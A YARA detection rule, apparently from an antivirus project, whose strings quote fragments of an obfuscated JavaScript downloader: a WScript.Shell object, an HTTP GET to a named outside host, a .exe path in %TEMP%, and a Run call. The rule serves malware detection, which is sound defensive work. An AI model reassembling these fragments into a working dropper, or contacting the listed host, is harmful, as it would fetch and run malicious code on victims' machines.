rule sig_20160328_490a88b54f834423f386b919d0070da6 {
  meta:
    description = "datamaliciousorder - file 20160328_490a88b54f834423f386b919d0070da6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c6a4617f6e09014fb6c11b979c15e642aea1a6b5e4c05726fc7d7bbc78e02b70"

  strings:
    $s1  = "function Ljqgqufz() {return Ynijqg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"fUEaO6RhNwL.exe\";};" fullword ascii
    $s2  = "Xfsgars[Qoiyc](\"GET\", \"http://finnskogen-oppvekstsenter.com/o4paka\", false);" fullword ascii
    $s3  = "do {WScript[Fafuhyrfs](Nvmks() * 11)} while (Xfsgars[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Xhlwuzbe(Qultkluzh, Wyteob){return Qultkluzh - Wyteob;};" fullword ascii
    $s5  = "var Ynijqg = function Swysrliy() {return WScript[Afyosolpfc](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vqglwgvt(Ogror){Ynijqg[\"Run\"](Ogror, Mmdenb, Mmdenb);};" fullword ascii
    $s7  = "function Vnqlbsdiq() {return ((Bhjphg == true) && (Bhjphg == Vqbuxfq)) ? 1 : Mmdenb;};" fullword ascii
    $s8  = "var Agncnn = false;" fullword ascii
    $s9  = " while (Rwdngxbpw){" fullword ascii
    $s10 = "Bhjphg = true; " fullword ascii
    $s11 = "function Geogwmlbq()" fullword ascii
    $s12 = "function Vuabvup(){return Afyosolpfc;};" fullword ascii
    $s13 = "var Bhjphg = false;" fullword ascii
    $s14 = "function Nvmks(){return 22;};" fullword ascii
    $s15 = "function Obkls(Vfijtij) {var Hybvptm = (1, 2, 3, 4, 5, Vfijtij); return Hybvptm;};" fullword ascii
    $s16 = "return Xhlwuzbe(Mgmbelyzfb, Pfocxu);" fullword ascii
    $s17 = "var Smegpj = new this[\"Date\"]();" fullword ascii
    $s18 = "Vqbuxfq = true; " fullword ascii
    $s19 = "function Sotucbpcdq(){return Oullonpzpr;};" fullword ascii
    $s20 = "var Vqbuxfq = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}